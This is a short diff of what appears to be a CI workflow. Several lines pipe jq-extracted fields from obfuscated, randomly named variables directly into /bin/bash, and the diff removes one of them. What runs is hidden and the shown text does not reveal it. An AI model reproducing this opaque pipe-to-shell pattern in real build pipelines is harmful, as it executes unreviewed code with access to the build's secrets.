@@ -23,7 +23,6 @@ jobs:
           echo $ocrx93 | jq -r .fmlte512 | /bin/bash
           echo $acdd4 | jq -r .i4004 | /bin/bash
           echo $gqbev3 | jq -r .cznj95 | /bin/bash
-          printf '%s' "$sgg068" | jq -r .zhkf49976 | /bin/bash
           printf '%s' "$w79690" | jq -r .azob5620 | /bin/bash
 
       - name: Upload artifact
